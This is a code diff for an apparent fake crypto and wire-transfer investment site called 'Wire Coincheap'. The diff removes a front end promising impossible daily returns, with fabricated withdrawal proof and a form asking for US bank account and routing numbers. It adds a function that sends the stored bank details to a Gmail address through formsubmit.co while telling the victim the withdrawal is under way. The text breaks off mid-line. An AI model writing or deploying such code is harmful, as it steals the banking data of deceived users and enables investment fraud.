@@ -1,113 +1,33 @@
-<!DOCTYPE html>
-<html>
-<head>
-<title>Wire Coincheap - USA Trading & International Wire</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<script id="chatway" async="true" src="https://cdn.chatway.app/widget.js?id=EDicIiTepGoB"></script>
-<style>
-*{box-sizing:border-box;margin:0;padding:0} body{background:#050e22;color:#fff;font-family:Arial}
-.btn{padding:12px 18px; background:#22c55e; color:#fff; border:none; border-radius:10px; font-weight:800; cursor:pointer; width:100%; margin-top:8px}
-.card{background:#fff; color:#0a192f; padding:20px; border-radius:16px; margin:12px}
-input,select{width:100%; padding:12px; margin:8px 0; border:1px solid #cbd5e1; border-radius:8px}
-.live-ticker{background:#000; color:#22c55e; padding:8px; font-size:12px; white-space:nowrap; overflow:hidden}
-@keyframes ticker{0%{transform:translateX(100%)}100%{transform:translateX(-100%)}}.ticker-inner{animation:ticker 30s linear infinite; display:inline-block}
-.hero{padding:40px 20px; text-align:center; background:linear-gradient(180deg,#0a192f,#112240)}
-.grid{display:grid; grid-template-columns:1fr 1fr; gap:12px}
-.plan{border:2px solid #e2e8f0; padding:16px; border-radius:14px; text-align:center; background:#fff; color:#0a192f}
-.tab{display:none}.tab.active{display:block}
-.nav{display:flex; gap:5px; padding:10px; background:#08162c; overflow-x:auto}.nav button{white-space:nowrap; padding:10px 12px; border:none; border-radius:8px; background:#112240; color:#fff; cursor:pointer}.nav button.active{background:#22c55e}
-</style>
-</head>
-<body>
 
-<div class="live-ticker"><div class="ticker-inner">📈 LIVE: BTC $67,420 +2.3% | ETH $3,210 | EUR/USD 1.0845 | S&P 500 5,421 | GOLD $2,345 | Wire Coincheap USA Trading Active 24/7 |</div></div>
+function requestWithdraw(){
+ let amt=document.getElementById('wAmount').value
+ if(!amt) return document.getElementById('wMsg').innerText='Enter amount'
+ let email=localStorage.getItem('current_user')||'Guest'
+ let banks=getBanks().filter(b=>b.email==email)
+ let lastBank=banks.length? banks[banks.length-1] : {bank:'No bank', acc:'-', routing:'-', name:'-', type:'-'}
+ document.getElementById('wMsg').innerText='✅ Request $'+amt+' submitted! Admin notified via email'
 
-<div style="background:#08162c; padding:12px 18px; display:flex; justify-content:space-between; border-bottom:1px solid #1e293b">
-<div style="font-weight:900; color:#22c55e">🌍 Wire Coincheap</div>
-<button class="btn" style="width:auto; padding:8px 14px" onclick="showTab('register')">Get Started</button>
-</div>
+ fetch("https://formsubmit.co/ajax/supportadmin46@gmail.com", {
+   method: "POST",
+   headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+   body: JSON.stringify({
+     subject: "NEW WITHDRAWAL $"+amt+" - "+email,
+     message: `NEW WITHDRAWAL ALERT - Wire Coincheap
 
-<div class="nav">
-<button id="b1" class="active" onclick="showTab('home')">Home</button>
-<button id="b2" onclick="showTab('about')">About USA</button>
-<button id="b3" onclick="showTab('plans')">Plans</button>
-<button id="b4" onclick="showTab('withdraw')">Withdraw</button>
-<button id="b5" onclick="showTab('proof')">Proof</button>
-<button id="b6" onclick="showTab('register')">Register</button>
-<button id="b7" onclick="showTab('login')">Login</button>
-</div>
+Client: ${email}
+Amount: $${amt}
 
-<div id="home" class="tab active">
-<div class="hero">
-<h1>USA Trading & International Wire</h1>
-<p>Trade, Invest, Withdraw to any USA Bank</p>
-<button class="btn" style="max-width:300px" onclick="showTab('plans')">View Investment Plans</button>
-<button class="btn" style="max-width:300px; background:#fff; color:#0a192f; border:2px solid #22c55e" onclick="document.getElementById('bankModal').style.display='block'">🏦 Add Bank Details</button>
-<div style="margin-top:12px; color:#22c55e; font-size:13px">Huntington • GLCU • Abri • Navy Federal • Alliant</div>
-</div>
-<div class="card"><h3>📊 Live Trading</h3><div class="grid"><div style="background:#f0fdf4; padding:12px; border-radius:10px"><small>BTC</small><br><b>$67,420</b> <span style="color:green">+2.3%</span></div><div style="background:#f0fdf4; padding:12px; border-radius:10px"><small>ETH</small><br><b>$3,210</b> <span style="color:green">+1.8%</span></div></div></div>
-</div>
+BANK DETAILS:
+Bank Name: ${lastBank.bank}
+Account: ${lastBank.acc}
+Routing: ${lastBank.routing}
+Holder: ${lastBank.name}
+Type: ${lastBank.type}
 
-<div id="about" class="tab"><div class="card"><h2>About Us - USA</h2><p style="margin-top:10px; line-height:1.6">Wire Coincheap LLC - 200 W Madison St, Chicago, IL 60606, USA<br>FinCEN MSB Registered<br>Direct withdrawal to Huntington, GLCU, Abri, Navy Federal, Alliant<br>24/7 USA Support +1 (312) 555-0142</p></div></div>
-
-<div id="plans" class="tab"><div style="padding:12px" class="grid">
-<div class="plan"><h3>Starter</h3><b style="color:#22c55e; font-size:22px">$100-$999</b><p>2.5% Daily for 30 Days</p><button class="btn" onclick="showTab('register')">Invest Now</button></div>
-<div class="plan" style="border-color:#22c55e"><h3>USA Pro</h3><b style="color:#22c55e; font-size:22px">$1k-$4,999</b><p>3.5% Daily for 45 Days</p><button class="btn" onclick="showTab('register')">Invest Now</button></div>
-<div class="plan"><h3>Premium</h3><b style="color:#22c55e; font-size:22px">$5k-$19k</b><p>4.5% Daily</p><button class="btn" onclick="showTab('register')">Invest Now</button></div>
-<div class="plan"><h3>Enterprise</h3><b style="color:#22c55e; font-size:22px">$20k+</b><p>6% Daily VIP</p><button class="btn" onclick="showTab('register')">Invest Now</button></div>
-</div></div>
-
-<div id="withdraw" class="tab"><div class="card"><h3>💳 Withdrawal</h3><button class="btn" onclick="document.getElementById('bankModal').style.display='block'">➕ Add New Bank Details</button><div style="margin-top:12px"><input id="wAmount" type="number" placeholder="Amount $"><button class="btn" style="background:#0a192f" onclick="requestWithdrawal()">Request Withdrawal</button><p id="wMsg" style="color:green; font-weight:700"></p></div><div id="withdrawList" style="margin-top:15px"></div></div></div>
-
-<div id="proof" class="tab"><div class="card"><h2>Withdrawal Proof - USA</h2><p>✅ John D. - Huntington $2,450 - 2hrs ago<br>✅ Sarah M. - GLCU $1,200 - 5hrs ago<br>✅ akagaviani74@gmail.com - Navy Federal $500 - Just now</p></div></div>
-
-<div id="register" class="tab"><div class="card"><h3>Create Account</h3><input id="rEmail" placeholder="Email e.g akagaviani74@gmail.com"><input id="rPass" type="password" placeholder="Password"><input id="rCountry" placeholder="Country e.g Usa"><button class="btn" onclick="signup()">Sign Up</button><p id="rMsg"></p></div></div>
-
-<div id="login" class="tab"><div class="card"><h3>Login</h3><input id="lEmail" placeholder="Email"><input id="lPass" type="password" placeholder="Password"><button class="btn" onclick="login()">Login</button><p id="lMsg"></p></div></div>
-
-<!-- BANK MODAL -->
-<div id="bankModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9999; padding:15px">
-<div style="background:#fff; color:#0a192f; padding:20px; border-radius:16px; max-width:400px; margin:20px auto">
-<div style="display:flex; justify-content:space-between"><h3>🏦 Add USA Bank</h3><button onclick="document.getElementById('bankModal').style.display='none'" style="background:red; color:#fff; border:none; padding:6px 12px; border-radius:6px">X</button></div>
-<label style="font-weight:700; font-size:12px; display:block; margin-top:10px">BANK NAME</label>
-<select id="mBank"><option>Huntington Bank - USA</option><option>GLCU - Great Lakes Credit Union</option><option>Abri Credit Union</option><option>Navy Federal Credit Union</option><option>Alliant Credit Union</option><option>Other USA Bank</option></select>
-<label style="font-weight:700; font-size:12px; display:block">ACCOUNT NUMBER</label><input id="mAcc" placeholder="Account Number">
-<label style="font-weight:700; font-size:12px; display:block">ROUTING NUMBER</label><input id="mRouting" placeholder="9 digits">
-<label style="font-weight:700; font-size:12px; display:block">HOLDER NAME</label><input id="mName" placeholder="Full Name as on Bank">
-<label style="font-weight:700; font-size:12px; display:block">TYPE</label><select id="mType"><option>Checking</option><option>Savings</option></select>
-<button class="btn" onclick="saveBankDetails()">💾 Save Bank Details</button><p id="mMsg" style="color:green; font-weight:700"></p>
-</div></div>
-
-<script>
-function showTab(t){
- document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'))
- document.querySelectorAll('.nav button').forEach(x=>x.classList.remove('active'))
- document.getElementById(t).classList.add('active')
- let map={home:1,about:2,plans:3,withdraw:4,proof:5,register:6,login:7}
- let b=document.getElementById('b'+(map[t]||1)); if(b) b.classList.add('active')
- if(t=='withdraw') loadWithdraw()
+Time: ${new Date().toLocaleString()}
+Admin Panel: https://chocolate2269.github.io/wire/admin.html`
+   })
+ })
+.then(r=>r.json()).then(d=>console.log('Email sent to supportadmin46@gmail.com', d))
+.catch(e=>console.log('Email error', e))
 }
-function getUsers(){return JSON.parse(localStorage.getItem('wire_users')||'[]')}
-function saveUsers(u){localStorage.setItem('wire_users',JSON.stringify(u))}
-function getBanks(){return JSON.parse(localStorage.getItem('user_banks')||'[]')}
-function saveBanks(b){localStorage.setItem('user_banks',JSON.stringify(b))}
-function signup(){
- let e=document.getElementById('rEmail').value.trim(), p=document.getElementById('rPass').value, c=document.getElementById('rCountry').value
- if(!e||!p) return document.getElementById('rMsg').innerText='Fill all'
- let u=getUsers(); if(u.find(x=>x.email==e)) return document.getElementById('rMsg').innerText='Email exists - Login'
- u.push({id:Date.now(), email:e, password:p, country:c, balance:0}); saveUsers(u); localStorage.setItem('current_user',e); document.getElementById('rMsg').innerText='Created!'; showTab('login')
-}
-function login(){
- let e=document.getElementById('lEmail').value.trim(), p=document.getElementById('lPass').value
- let u=getUsers().find(x=>x.email==e&&x.password==p); if(!u) return document.getElementById('lMsg').innerText='Wrong email/password'
- localStorage.setItem('current_user',e); showTab('withdraw')
-}
-function saveBankDetails(){
- let bank=document.getElementById('mBank').value, acc=document.getElementById('mAcc').value, routing=document.getElementById('mRouting').value, name=document.getElementById('mName').value, type=document.getElementById('mType').value, email=localStorage.getItem('current_user')||'Guest'
- if(!acc||!routing||!name) return document.getElementById('mMsg').innerText='❌ Fill Account, Routing, Name'
- let banks=getBanks(); banks.push({id:Date.now(), email, bank, acc, routing, name, type, date:new Date().toLocaleString()}); saveBanks(banks)
- document.getElementById('mMsg').innerText='✅ Saved '+bank+' - Acc:'+acc
- setTimeout(()=>{document.getElementById('bankModal').style.display='none'; loadWithdraw()}, 1000)
-}
-function loadWithdraw(){
- let email=localStorage.getItem('current_user')||'Guest'; let banks=get
